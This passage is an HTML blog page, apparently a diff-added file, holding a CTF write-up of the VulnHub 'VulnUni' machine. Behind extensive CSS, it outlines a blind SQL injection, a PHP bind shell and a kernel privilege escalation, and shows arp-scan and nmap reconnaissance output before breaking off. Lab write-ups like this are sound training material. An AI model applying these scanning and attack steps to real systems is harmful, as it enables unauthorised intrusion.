@@ -1,0 +1,1244 @@
+<!doctype html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#0055FF"><meta name="robots" content="index,follow"><title>VulnUni CTF Writeup - Tyler Butler</title><meta name="description" content="Unauthenticated blind SQL injection on the Greek University GUnet Platform"><meta property="og:title" content="VulnUni CTF Writeup - Tyler Butler"><meta property="og:description" content="Unauthenticated blind SQL injection on the Greek University GUnet Platform"><meta property="og:url" content="https://tbutler.org/posts/2020/06/vulnuni-ctf-writeup/"><meta property="og:image" content="https://tbutler.org/assets/images/meta-logo.png"><meta name="twitter:site" content="@tbutler0x90"><meta name="twitter:creator" content="@tbutler0x90"><meta name="twitter:title" content="VulnUni CTF Writeup - Tyler Butler"><meta name="twitter:card" content="description"><meta name="twitter:image" content="https://tbutler.org/assets/images/meta-logo.png"><link rel="shortcut icon" href="/assets/images/favicon.ico"><link rel="alternate" type="application/rss+xml" title="Feed for posts" href="/posts/feed.xml"><link rel="alternate" type="application/rss+xml" title="Feed for screencasts" href="/screencasts/feed.xml"><style>@font-face {
+  font-family: 'IBM Plex Sans';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: local('IBM Plex Sans'), local('IBMPlexSans'),
+       url('/assets/fonts/IBMPlexSans-Text.woff2') format('woff2');
+}
+@font-face {
+  font-family: 'IBM Plex Sans';
+  font-style: italic;
+  font-weight: 400;
+  font-display: swap;
+  src: local('IBM Plex Sans Italic'), local('IBMPlexSans-Italic'),
+       url('/assets/fonts/IBMPlexSans-Italic.woff2') format('woff2');
+}
+@font-face {
+  font-family: 'IBM Plex Sans';
+  font-style: normal;
+  font-weight: 600;
+  font-display: swap;
+  src: local('IBM Plex Sans Semi-bold'), local('IBMPlexSans-Semi-bold'),
+       url('/assets/fonts/IBMPlexSans-SemiBold.woff2') format('woff2');
+}
+
+    /* ==========================================================================
+   VARIABLES
+   ========================================================================== */
+
+
+:root {
+  --font-family-sans: 'IBM Plex Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
+  --font-family-code: Menlo, Monaco, monospace;
+
+  --font-size-base: 1rem;
+  --font-size-md: 1.25rem;
+  --font-size-lg: 1.5rem;
+  --font-size-xl: 1.75rem;
+  --font-size-2xl: 2.25rem;
+  --font-size-3xl: 2.5rem;
+  --font-size-4xl: 3rem;
+  --font-size-5xl: 4rem;
+
+  --space-0: 0;
+  --space-1: .25rem;
+  --space-2: .5rem;
+  --space-3: 1rem;
+  --space-4: 2rem;
+  --space-5: 4rem;
+
+  --color-blue: #0055FF;
+  --color-red: #FF3300;
+  --color-yellow: #FFCC00;
+  --color-green: #4CA55E;
+
+  --color-blue-100: #CCDBFF;
+  --color-red-100: #FFD3CC;
+  --color-yellow-100: #FFF8CC;
+  --color-green-100: #D9EFDE;
+
+  --mark: var(--color-yellow-100);
+  --outline: 0 0 0 3px var(--color-yellow);
+  --gap: var(--space-3);
+  --radius: 4px;
+  --shadow: 0 1px 2px rgba(0,0,0,0.07),
+            0 2px 4px rgba(0,0,0,0.07),
+            0 4px 8px rgba(0,0,0,0.07),
+            0 8px 16px rgba(0,0,0,0.07),
+            0 16px 32px rgba(0,0,0,0.07),
+            0 32px 64px rgba(0,0,0,0.07);
+
+  --theme-color: #24292e;
+  --theme-color-primary: var(--color-blue);
+  --theme-color-gray: #6a737d;
+  --theme-color-gray-light: #F6F8FA;
+  --theme-background-color: #FFFFFF;
+  --theme-border-color: #EEEEEE;
+}
+
+@media (min-width: 720px) {
+  :root {
+    --gap: var(--space-4);
+  }
+}
+
+
+
+
+/* ==========================================================================
+   BASE
+   ========================================================================== */
+
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+html {
+  scroll-behavior: smooth;
+  -webkit-text-size-adjust: 100%;
+}
+
+body {
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
+  overflow-x: hidden;
+  max-width: 45rem;
+  margin-right: auto;
+  margin-left: auto;
+  padding: var(--space-5) var(--space-3);
+  font-family: var(--font-family-sans);
+  line-height: 1.5;
+  color: var(--theme-color);
+  background-color: var(--theme-background-color);
+}
+
+h1, h2, h3,
+h4, h5, h6 {
+  font-size: 1rem;
+  font-weight: 600;
+  line-height: 1.2;
+}
+
+.o-stack--prose > * + h2,
+.o-stack--prose > * + h3 {
+  margin-top: var(--space-4);
+}
+
+.o-stack--prose h2 {
+  font-size: var(--font-size-lg);
+}
+
+.o-stack--prose h3 {
+  font-size: var(--font-size-md);
+}
+
+.o-stack--lead p:first-of-type {
+  font-size: var(--font-size-lg);
+  line-height: 1.3;
+}
+
+a {
+  color: inherit;
+  text-decoration-color: var(--theme-color-primary);
+}
+
+a:hover,
+a:focus {
+  color: var(--theme-color-primary);
+}
+
+a:focus {
+  outline: 0;
+  box-shadow: var(--outline) !important;
+}
+
+h2 a {
+  color: var(--theme-color-primary);
+  text-decoration: none;
+}
+
+h2 a:hover {
+  text-decoration: underline;
+}
+
+strong {
+  font-weight: 600;
+}
+
+img {
+  max-width: 100%;
+  vertical-align: middle;
+}
+
+ul {
+  list-style: none;
+}
+
+ul:not([class]) li {
+  position: relative;
+  padding-left: 1.1rem;
+}
+
+ul:not([class]) li + li {
+  margin-top: var(--space-1);
+}
+
+ul:not([class]) li::before {
+  content: '–';
+  position: absolute;
+  top: 0;
+  left: 0;
+  color: var(--theme-color-gray);
+}
+
+dt {
+  font-weight: 600;
+}
+
+dd + dt {
+  margin-top: var(--space-2);
+}
+
+blockquote p {
+  font-style: italic;
+}
+
+figure blockquote p::before { content: '“'; }
+figure blockquote p::after { content: '”'; }
+
+figure blockquote p {
+  text-indent: -.25rem;
+}
+
+blockquote {
+  border-left: 4px solid var(--theme-border-color);
+  padding-left: var(--space-3);
+}
+
+main {
+  margin-bottom: var(--space-5);
+  outline: none;
+}
+
+mark {
+  padding-right: .1em;
+  padding-left: .1em;
+  background-color: var(--mark);
+}
+
+hr {
+  margin-top: 2rem !important;
+  margin-bottom: 2rem;
+  width: 100%;
+  border: 0;
+  height: 4px;
+  background-color: var(--theme-border-color);
+}
+
+kbd {
+  display: inline-block;
+  padding-right: 4px;
+  padding-left: 4px;
+  background-color: #FAFAFA;
+  border: 1px solid #EAEAEA;
+  box-shadow: inset 0 -1px 0 #D9EFDE;
+  border-radius: var(--radius);
+  font-family: var(--font-family-code);
+  font-size: .95rem;
+  color: #222222;
+}
+
+
+
+/* ==========================================================================
+   OBJECTS
+   ========================================================================== */
+
+
+/**
+ * ASPECT-RATIO
+ */
+
+[style*='--aspect-ratio'] > :first-child {
+  height: auto;
+  width: 100%;
+}
+
+@supports (--custom: property) {
+  [style*='--aspect-ratio'] {
+    position: relative;
+    width: 100%;
+    background-color: var(--color-gray-100);
+  }
+
+  [style*='--aspect-ratio']::before {
+    content: '';
+    display: block;
+    padding-bottom: calc(100% / (var(--aspect-ratio)));
+  }
+
+  [style*='--aspect-ratio'] > :first-child {
+    position: absolute;
+    top: 0;
+    left: 0;
+    height: 100%;
+    width: 100%;
+  }
+}
+
+
+/**
+ * BREAKOUT
+ */
+.o-breakout {
+  position: relative;
+  width: 100vw;
+  position: relative;
+  left: 50%;
+  right: 50%;
+  margin-left: -50vw;
+  margin-right: -50vw;
+}
+
+
+.o-container {
+  max-width: 45rem;
+  margin-right: auto;
+  margin-left: auto;
+  padding-right: var(--space-3);
+  padding-left: var(--space-3);
+}
+
+.o-container--lg {
+  max-width: 75rem;
+}
+
+
+/**
+ * GRID
+ */
+
+.o-grid {
+  display: flex;
+  flex-wrap: wrap;
+  margin-left: calc(var(--gap) * -1);
+  margin-bottom: calc(var(--gap) * -1);
+}
+
+.o-grid--justify-end {
+  justify-content: flex-end;
+}
+
+@media(min-width: 720px) {
+  .o-grid--reversed\@md {
+    flex-direction: row-reverse;
+  }
+}
+
+.o-grid + .o-grid {
+  margin-top: var(--gap);
+}
+
+.o-grid--align-center {
+  align-items: center;
+}
+
+@media (min-width: 720px) {
+  .o-grid--align-center\@md {
+    align-items: center;
+  }
+}
+
+.o-grid__col {
+  display: flex;
+  flex-direction: column;
+  width: 100%;
+  padding-left: var(--gap);
+  margin-bottom: var(--gap);
+}
+
+
+/**
+ * STACK
+ */
+
+.o-stack > * + *    { margin-top: var(--space-3); }
+.o-stack--1 > * + * { margin-top: var(--space-1); }
+.o-stack--2 > * + * { margin-top: var(--space-2); }
+.o-stack--3 > * + * { margin-top: var(--space-3); }
+.o-stack--4 > * + * { margin-top: var(--space-4); }
+.o-stack--5 > * + * { margin-top: var(--space-5); }
+
+
+/**
+ * TAGS
+ */
+
+.o-tags {
+  list-style: none;
+  display: flex;
+  flex-wrap: wrap;
+}
+
+.o-tags--center {
+  justify-content: center;
+}
+
+.o-tags__item {
+  margin-right: var(--space-2);
+  margin-bottom: var(--space-2);
+}
+
+
+/* ==========================================================================
+   COMPONENTS
+   ========================================================================== */
+
+
+/**
+ * AVATAR
+ */
+
+.c-avatar {
+  flex-shrink: 0;
+  border-radius: 50%;
+  box-shadow: 0 0 0 3px var(--theme-border-color);
+}
+
+
+/**
+ * BANNER
+ */
+
+.c-banner {
+  display: flex;
+  align-items: flex-start;
+  justify-content: space-between;
+  margin-bottom: var(--space-5);
+}
+
+@media (min-width: 720px) {
+  .c-banner {
+    align-items: center;
+  }
+}
+
+.c-banner__branding {
+  display: inline-block;
+  border-radius: var(--radius);
+}
+
+.c-banner__branding svg {
+  vertical-align: top;
+  border-radius: var(--radius);
+}
+
+@media (max-width: 720px) {
+  .c-banner__nav {
+    display: flex;
+    justify-content: flex-end;
+  }
+}
+
+.c-banner__nav-list {
+  list-style: none;
+  display: flex;
+  flex-direction: column;
+}
+
+@media (min-width: 720px) {
+  .c-banner__nav-list {
+    flex-direction: row;
+  }
+
+  .c-banner__nav-item + .c-banner__nav-item {
+    margin-left: var(--space-4);
+  }
+}
+
+.c-banner__nav-anchor {
+  text-decoration: none;
+}
+
+
+/**
+ * BUTTON
+ */
+
+.c-button {
+  -webkit-appearance: none;
+  outline: none;
+  appearance: none;
+  display: inline-flex;
+  align-items: center;
+  padding: 0.6875rem 1rem;
+  background-color: #000000;
+  border: 1px solid #000000;
+  color: #fff;
+  font: inherit;
+  text-decoration: none;
+  border-radius: var(--radius);
+  cursor: pointer;
+  box-shadow: var(--shadow);
+  transition: all ease-in-out 0.2s;
+}
+
+.c-button:hover,
+.c-button:focus {
+  background-color: var(--theme-color-primary);
+  border-color: var(--theme-color-primary);
+  color: #FFFFFF;
+}
+
+.c-button--primary {
+  background-color: var(--theme-color-primary);
+  border-color: var(--theme-color-primary);
+}
+
+.c-button--primary:hover,
+.c-button--primary:focus {
+  background-color: #000000;
+  border-color: #000000;
+}
+
+.c-button--secondary {
+  background-color: var(--theme-background-color);
+  border-color: var(--theme-color-gray);
+  color: var(--theme-color-gray);
+  box-shadow: none;
+}
+
+.c-button:focus {
+  box-shadow: var(--outline);
+}
+
+.c-button svg {
+  margin-right: var(--space-2);
+  flex-shrink: 0;
+}
+
+.c-button--sm {
+  padding: var(--space-1) .75rem;
+  font-size: smaller;
+}
+
+
+/**
+ * CARD
+ */
+
+.c-card {
+  display: flex;
+  flex-direction: column;
+  flex-grow: 1;
+  padding: var(--space-4);
+  background-color: var(--theme-color-gray-light);
+  border-radius: var(--radius);
+}
+
+
+/**
+ * CONTENTINFO
+ */
+
+.c-contentinfo {
+  margin-top: auto;
+  padding-top: var(--space-5);
+  border-top: 1px solid var(--theme-border-color);
+}
+
+.c-contentinfo__list {
+  list-style: none;
+  display: flex;
+  flex-wrap: wrap;
+}
+
+.c-contentinfo__list + .c-contentinfo__list {
+  margin-top: var(--space-4);
+}
+
+.c-contentinfo__list-item + .c-contentinfo__list-item {
+  margin-left: var(--space-3);
+}
+
+@media (min-width: 720px) {
+  .c-contentinfo__list-item + .c-contentinfo__list-item {
+    margin-left: var(--space-4);
+  }
+}
+
+.c-contentinfo__list-anchor {
+  text-decoration: none;
+}
+
+
+/**
+ * HEADING-DECORATE
+ */
+
+.c-heading-decorate::after {
+  content: '\2009\00AC';
+  display: inline-block;
+  color: var(--theme-color-gray);
+  opacity: .5;
+}
+
+
+/**
+ * FORM
+ */
+
+.c-form__row + .c-form__row {
+  margin-top: var(--space-3);
+}
+
+.c-form__row--button {
+  display: flex;
+  align-items: flex-end;
+}
+
+.c-form__row--button div {
+  flex: 1;
+  margin-right: var(--space-3);
+}
+
+.c-form__label {
+  display: block;
+  margin-bottom: var(--space-1);
+  font-weight: 600;
+}
+
+.c-form__input {
+  display: block;
+  width: 100%;
+  padding: 0.6875rem var(--space-3);
+  font: inherit;
+  background-color: #FAFAFA;
+  border: 1px solid var(--theme-border-color);
+  border-radius: var(--radius);
+  outline: none;
+}
+
+.c-form__input:focus {
+  box-shadow: var(--outline);
+}
+
+
+/**
+ * NOTE
+ */
+
+.c-note {
+  padding: var(--space-3);
+  border: 1px solid var(--theme-border-color);
+  border-radius: var(--radius);
+}
+
+.c-note--primary {
+  border-color: var(--theme-color-primary);
+}
+
+.c-note__label {
+  font-weight: 600;
+}
+
+
+/**
+ * LINK
+ */
+
+.c-link {
+  display: inline-flex;
+  align-items: center;
+  color: var(--theme-color-primary);
+  text-decoration: none;
+}
+
+.c-link:hover,
+.c-link:focus {
+  text-decoration: underline;
+}
+
+.c-link svg {
+  margin-left: var(--space-1);
+}
+
+
+/**
+ * LISTING
+ */
+
+ .c-listing {
+  list-style: none;
+}
+
+.c-listing__item:not(:last-of-type) {
+  margin-bottom: var(--space-4);
+  padding-bottom: var(--space-4);
+  border-bottom: 1px solid var(--theme-border-color);
+}
+
+
+/**
+ * META
+ */
+
+@media (min-width: 720px) {
+  .c-meta {
+    display: grid;
+    grid-auto-flow: column;
+    grid-auto-columns: 1fr;
+    grid-template-rows: repeat(50, min-content);
+    grid-column-gap: var(--space-4);
+  }
+
+  .c-meta__title {
+    grid-row-start: 1;
+  }
+}
+
+
+/**
+ * PAGINATION
+ */
+
+.c-pagination {
+  display: flex;
+  align-items: center;
+}
+
+.c-pagination__item {
+  display: inline-flex;
+  align-items: center;
+  padding: var(--space-2) var(--space-3);
+  background-color: transparent;
+  color: inherit;
+  border: 1px solid currentColor;
+  text-decoration: none;
+  border-radius: var(--radius);
+  transition: all ease-in-out 0.2s;
+}
+
+.c-pagination__item:hover {
+  color: var(--theme-color-primary);
+}
+
+.c-pagination__item[rel="next"] {
+  margin-left: auto;
+}
+
+.c-pagination__item[rel="next"] svg {
+  margin-left: var(--space-1);
+}
+
+.c-pagination__item[rel="prev"] svg {
+  margin-right: var(--space-1);
+  transform: rotate(180deg);
+}
+
+
+/**
+ * PILL
+ */
+
+ .c-pill {
+  position: relative;
+  padding: var(--space-1) .75rem;
+  border-radius: var(--space-3);
+  color: var(--theme-color-primary);
+  text-decoration: none;
+  font-size: smaller;
+  -webkit-transition: var(--transition);
+  transition: var(--transition);
+}
+
+.c-pill:after {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: var(--theme-color-primary);
+  border-radius: var(--space-3);
+  opacity: .15;
+  -webkit-transition: var(--transition);
+  transition: var(--transition);
+  z-index: -1;
+}
+
+a.c-pill:hover {
+  color: #fff;
+}
+
+a.c-pill:hover:after {
+  opacity: 1;
+}
+
+
+/**
+ * SHARE
+ */
+
+.c-share {
+  position: relative;
+  display: -webkit-box;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.c-share::after {
+  content: '';
+  position: absolute;
+  top: 50%;
+  left: 0;
+  width: 100%;
+  height: 1px;
+  background-color: var(--theme-border-color);
+}
+
+.c-share span {
+  position: relative;
+  padding-right: 1rem;
+  background-color: var(--theme-background-color);
+  color: var(--theme-color-gray);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  z-index: 10;
+}
+
+.c-share__list {
+  position: relative;
+  list-style: none;
+  display: flex;
+  align-items: center;
+  padding-left: var(--space-3);
+  background-color: var(--theme-background-color);
+  z-index: 10;
+}
+
+.c-share__list-item:not(:last-of-type) {
+  margin-right: var(--space-3);
+}
+
+.c-share__list-anchor {
+  color: currentColor;
+}
+
+.c-share__list-anchor:hover {
+  color: var(--theme-color-primary);
+}
+
+
+/**
+ * VIDEO
+ */
+
+.c-video__backdrop[style] {
+  padding: var(--space-4);
+  background-color: var(--backdrop, #FAFAFA);
+}
+
+.c-video__caption {
+  margin-top: var(--space-2);
+  text-align: center;
+  color: var(--theme-color-gray);
+}
+
+
+/**
+ * QUOTE
+ */
+
+/* .c-quote {} */
+
+.c-quote__blockquote {
+  border-left: 0;
+  padding-left: 0;
+}
+
+.c-quote--feature .c-quote__blockquote {
+  text-align: center;
+  font-size: var(--font-size-md);
+}
+
+.c-quote__cite {
+  margin-top: var(--space-3);
+  display: flex;
+}
+
+.c-quote--feature .c-quote__cite {
+  flex-direction: column;
+  text-align: center;
+}
+
+.c-quote--default .c-quote__cite-media {
+  flex-shrink: 0;
+  margin-right: var(--space-3);
+}
+
+.c-quote--feature .c-quote__cite-body {
+  margin-top: var(--space-2);
+}
+
+
+
+
+/* ==========================================================================
+   UTILITIES
+   ========================================================================== */
+
+
+.u-text-center {
+  text-align: center;
+}
+
+
+/**
+ * WIDTHS
+ */
+
+.u-width-1of12 {
+  width: calc(100% * 1 / 12);
+}
+
+.u-width-3of12 {
+  width: calc(100% * 3 / 12);
+}
+
+.u-width-4of12 {
+  width: calc(100% * 4 / 12);
+}
+
+.u-width-6of12 {
+  width: calc(100% * 6 / 12);
+}
+
+.u-width-7of12 {
+  width: calc(100% * 7 / 12);
+}
+
+.u-width-8of12 {
+  width: calc(100% * 8 / 12);
+}
+
+.u-width-9of12 {
+  width: calc(100% * 9 / 12);
+}
+
+.u-offset-3of12 {
+  margin-left: calc(100% * 3 / 12);
+}
+
+.u-offset-4of12 {
+  margin-left: calc(100% * 4 / 12);
+}
+
+@media (min-width: 720px) {
+  .u-width-1of12\@md {
+    width: calc(100% * 1 / 12);
+  }
+
+  .u-width-3of12\@md {
+    width: calc(100% * 3 / 12);
+  }
+
+  .u-width-4of12\@md {
+    width: calc(100% * 4 / 12);
+  }
+
+  .u-width-6of12\@md {
+    width: calc(100% * 6 / 12);
+  }
+
+  .u-width-7of12\@md {
+    width: calc(100% * 7 / 12);
+  }
+
+  .u-width-8of12\@md {
+    width: calc(100% * 8 / 12);
+  }
+
+  .u-width-9of12\@md {
+    width: calc(100% * 9 / 12);
+  }
+
+  .u-offset-3of12\@md {
+    margin-left: calc(100% * 3 / 12);
+  }
+
+  .u-offset-4of12\@md {
+    margin-left: calc(100% * 4 / 12);
+  }
+}
+
+
+/**
+ * ORDER
+ */
+@media (min-width: 720px) {
+  .u-order-first\@md {
+    order: -9999;
+  }
+}
+
+
+/**
+ * SPACING
+ */
+
+.u-margin-right-1  { margin-right: var(--space-1) !important; }
+.u-margin-right-2  { margin-right: var(--space-2) !important; }
+.u-margin-right-3  { margin-right: var(--space-3) !important; }
+
+.u-margin-top-0 { margin-top: var(--space-0) !important; }
+.u-margin-top-1 { margin-top: var(--space-1) !important; }
+.u-margin-top-2 { margin-top: var(--space-2) !important; }
+.u-margin-top-3 { margin-top: var(--space-3) !important; }
+.u-margin-top-4 { margin-top: var(--space-4) !important; }
+.u-margin-top-5 { margin-top: var(--space-5) !important; }
+.u-margin-top-6 { margin-top: var(--space-6) !important; }
+
+@media (min-width: 720px) {
+  .u-margin-top-0\@md { margin-top: var(--space-0) !important; }
+  .u-margin-top-1\@md { margin-top: var(--space-1) !important; }
+  .u-margin-top-2\@md { margin-top: var(--space-2) !important; }
+  .u-margin-top-3\@md { margin-top: var(--space-3) !important; }
+  .u-margin-top-4\@md { margin-top: var(--space-4) !important; }
+  .u-margin-top-5\@md { margin-top: var(--space-5) !important; }
+  .u-margin-top-6\@md { margin-top: var(--space-6) !important; }
+}
+
+.u-padding-left-0 { padding-left: 0 !important; }
+
+/**
+ * FONT-SCALE
+ */
+
+.u-font-size-sm   { font-size: 88.8888889% !important; }
+.u-font-size-base { font-size: var(--font-size-base) !important; }
+.u-font-size-md   { font-size: var(--font-size-md) !important; }
+.u-font-size-lg   { font-size: var(--font-size-lg) !important; }
+.u-font-size-xl   { font-size: var(--font-size-xl) !important; }
+.u-font-size-2xl  { font-size: var(--font-size-2xl) !important; }
+.u-font-size-3xl  { font-size: var(--font-size-3xl) !important; }
+.u-font-size-4xl  { font-size: var(--font-size-4xl) !important; }
+.u-font-size-5xl  { font-size: var(--font-size-5xl) !important; }
+
+@media (min-width: 720px) {
+  .u-font-size-sm\@md   { font-size: 88.8888889% !important; }
+  .u-font-size-base\@md { font-size: var(--font-size-base) !important; }
+  .u-font-size-md\@md   { font-size: var(--font-size-md) !important; }
+  .u-font-size-lg\@md   { font-size: var(--font-size-lg) !important; }
+  .u-font-size-xl\@md   { font-size: var(--font-size-xl) !important; }
+  .u-font-size-2xl\@md  { font-size: var(--font-size-2xl) !important; }
+  .u-font-size-3xl\@md  { font-size: var(--font-size-3xl) !important; }
+  .u-font-size-4xl\@md  { font-size: var(--font-size-4xl) !important; }
+  .u-font-size-5xl\@md  { font-size: var(--font-size-5xl) !important; }
+}
+
+
+/**
+ * LEADING
+ */
+
+.u-leading-strict {
+  line-height: 1.1;
+}
+
+.u-leading-tight {
+  line-height: 1.3;
+}
+
+.u-text-uppercase {
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+
+/**
+ * FONT-WEIGHT
+ */
+
+.u-font-weight-normal {
+  font-weight: 400;
+}
+
+.u-font-weight-semi-bold {
+  font-weight: 600;
+}
+
+
+/**
+ * COLORS
+ */
+
+.u-color-primary {
+  color: var(--theme-color-primary);
+}
+
+.u-color-gray {
+  color: var(--theme-color-gray);
+}
+
+.u-primary-anchor {
+  color: var(--theme-color-primary);
+  text-decoration: none;
+}
+
+.u-primary-anchor:hover,
+.u-primary-anchor:focus {
+  text-decoration: underline;
+}
+
+
+/**
+ * HIDDEN-VISUALLY
+ */
+
+.u-hidden-visually {
+  border: 0 !important;
+  clip: rect(0 0 0 0) !important;
+  -webkit-clip-path: inset(50%) !important;
+  clip-path: inset(50%) !important;
+  height: 1px !important;
+  margin: -1px !important;
+  overflow: hidden !important;
+  padding: 0 !important;
+  position: absolute !important;
+  white-space: nowrap !important;
+  width: 1px !important;
+}
+
+
+/**
+ * FLEXBOX
+ */
+
+.u-flex {
+  display: flex;
+}
+
+.u-justify-center {
+  justify-content: center;
+}
+
+.u-justify-between {
+  justify-content: space-between;
+}
+
+.u-align-center {
+  align-items: center;
+}
+
+.u-flex-shrink-0 {
+  flex-shrink: 0;
+}
+
+
+/**
+ * BORDERS
+ */
+
+.u-bordered {
+  border: 1px solid var(--theme-border-color);
+}
+
+.u-border-none {
+  border: 0;
+}
+
+.u-shadow {
+  box-shadow: var(--shadow);
+}
+
+.u-rounded {
+  border-radius: var(--radius);
+}
+
+.u-text-right {
+  text-align: right;
+}
+
+@media (prefers-reduced-motion: reduce) {
+  * {
+    animation-duration: 0.01ms !important;
+    animation-iteration-count: 1 !important;
+    transition-duration: 0.01ms !important;
+    scroll-behavior: auto !important;
+  }
+}
+
+    code[class*="language-"],
+pre[class*="language-"] {
+  font-family: var(--font-family-code);
+  direction: ltr;
+  text-align: left;
+  white-space: pre;
+  word-spacing: normal;
+  word-break: normal;
+  font-size: .95rem;
+  line-height: 1.3;
+
+  -moz-tab-size: 4;
+  -o-tab-size: 4;
+  tab-size: 4;
+
+  -webkit-hyphens: none;
+  -moz-hyphens: none;
+  -ms-hyphens: none;
+  hyphens: none;
+}
+
+code:not([class]) {
+  padding: 2px 4px;
+  font-family: var(--font-family-code);
+  font-size: .875rem;
+  background-color: #FAFAFA;
+  border: 1px solid #EAEAEA;
+  border-radius: 4px;
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+  position: relative;
+  padding-top: 1em;
+  padding-bottom: 1em;
+  overflow: auto;
+  background-color: #FAFAFA;
+  border: 1px solid #EAEAEA;
+  color: #222222;
+  border-radius: 4px;
+}
+
+.highlight-line {
+  padding: 0.25rem 1rem;
+  border-left: 4px solid #FAFAFA;
+}
+
+.highlight-line-active {
+  background-color: var(--color-blue-100);
+  border-color: var(--theme-color-primary);
+}
+
+.highlight-line-add {
+  background-color: var(--color-green-100);
+  border-color: var(--color-green);
+}
+
+.highlight-line-remove {
+  background-color: var(--color-red-100);
+  border-color: var(--color-red);
+}
+
+.token.comment {
+  color: #777;
+}</style></head><body><header class="c-banner" role="banner"><a class="c-banner__branding" href="/"><span class="u-hidden-visually">Tyler Butler</span> <svg aria-hidden="true" focusable="false" viewBox="0 0 40 40" width="4rem" height="4rem" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path fill="var(--theme-color-primary, #000)" d="M0 0h40v40H0z"/><path fill="#fff" d="M20.515 12.273c1.667 0 3.606.454 5.243 1.363v7.485c0 2.515.394 3.303 1.424 3.303 1.454 0 2.515-1.515 2.515-6.424 0-5.273-2.91-8.515-9.212-8.515-6.515 0-10.152 4.394-10.152 10.697 0 6.454 3.515 10.515 10.182 10.515 2.091 0 4.394-.455 5.97-1.03l1.121 3.303c-1.909.727-4.576 1.272-7.121 1.272C11.697 34.242 6 28.758 6 20.182 6 11.939 12.06 6 20.515 6 29.121 6 34 11.727 34 17.94c0 5.484-2.606 9.454-6.606 9.454-2.424 0-3.727-1.606-4.06-3.091-.728 1.697-2.122 2.97-4.334 2.97-3.848 0-5.545-2.91-5.545-6.818 0-4.97 2.575-8.182 7.06-8.182zm-.879 12c1.091 0 1.728-.788 2.061-1.485v-7.212c-.455-.182-.818-.273-1.333-.273-1.576 0-2.576 1.273-2.576 5.182 0 2.788.576 3.788 1.848 3.788z"/></g></svg></a><nav class="c-banner__nav"><ul class="c-banner__nav-list"><li class="c-banner__nav-item"><a class="c-banner__nav-anchor" href="/work/">Work</a></li><li class="c-banner__nav-item"><a class="c-banner__nav-anchor" href="/posts/">Posts</a></li><li class="c-banner__nav-item"><a class="c-banner__nav-anchor" href="/contact/">Contact</a></li></ul></nav></header><main id="main" tabindex="-1"><article class="o-stack o-stack--4"><header><time class="u-color-gray u-text-uppercase">Jun 2, 2020</time><h1 class="u-font-size-2xl">VulnUni CTF Writeup</h1></header><div class="o-stack o-stack--prose"><div class="row mt-3"><div class="col-sm mt-3 mt-md-0"><img class="img-fluid rounded z-depth-1" src="/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni-header.png"></div></div><br><p>VulnUni is a CTF challenge hosted on VulnHub and created by @emaragkos. It is a boot2root web application challenge that focuses on SQL injection vulnerabilities and linux privilege escalation. To solve this challenge, I used an unauthenticated blind SQL injection vulnerability, a php bind shell upload, and a linux kernel privilege escalation vulnerability. My workstation setup included VMware fusion and the 2020 release of Kali Linux for VMware which can be found on Offensive Securities VM Image Download Page. One interesting aspect of this challenge is the use of a vulnerable E-learning platform from the Greek University Network GUnet.</p><h4>Getting Started</h4><p>First, I launched both the VulnUni and Kali Linux virtual machines on the same local network. To identify the ip addresses of my local attack machine and the target, I ran an arp-scan.</p><pre class="language-bash"><code class="language-bash"><div class="highlight-line">root@kali$ arp-scan -I eth1 -l</div><div class="highlight-line">Interface: eth1, type: EN10MB, MAC: 00:50:56:3e:70:2d, IPv4: <span class="token number">192.168</span>.8.131</div><div class="highlight-line">Starting arp-scan <span class="token number">1.9</span>.7 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span></div><div class="highlight-line"><span class="token number">192.168</span>.8.1     00:50:56:c0:00:01       VMware, Inc.</div><div class="highlight-line"><span class="token number">192.168</span>.8.132   00:0c:29:bc:43:d1       VMware, Inc.</div><div class="highlight-line"><span class="token number">192.168</span>.8.254   00:50:56:e7:01:af       VMware, Inc.</div><div class="highlight-line"></div><div class="highlight-line"><span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel</div><div class="highlight-line">Ending arp-scan <span class="token number">1.9</span>.7: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.991</span> seconds <span class="token punctuation">(</span><span class="token number">128.58</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</div></code></pre><p>With the ip address handy, I started a couple quick nmap scans to kick off some basic enumeration to learn more about the target. I used one quick nmap scan to get an idea of what was open as well as a longer scan to check all ports.</p><pre class="language-bash"><code class="language-bash"><div class="highlight-line">root@kali$ nmap -sV -A -O <span class="token number">192.168</span>.8.132</div><div class="highlight-line">Starting Nmap <span class="token number">7.80</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2020</span>-05-08 <span class="token number">20</span>:45 EDT</div><div class="highlight-line">Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.8.132</div><div class="highlight-line">Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00077s latency<span class="token punctuation">)</span>.</div><div class="highlight-line">Not shown: <span class="token number">999</span> closed ports</div><div class="highlight-line">PORT   STATE SERVICE VERSION</div><div class="highlight-line"><span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.2</span>.22 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span></div><div class="highlight-line"><span class="token operator">|</span>_http-server-header: Apache/2.2.22 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span></div><div class="highlight-line"><span class="token operator">|</span>_http-title: VulnUni – We train the <span class="token function">top</span> Information Security Professionals</div><div class="highlight-line">MAC Address: 00:0C:29:BC:43:D1 <span class="token 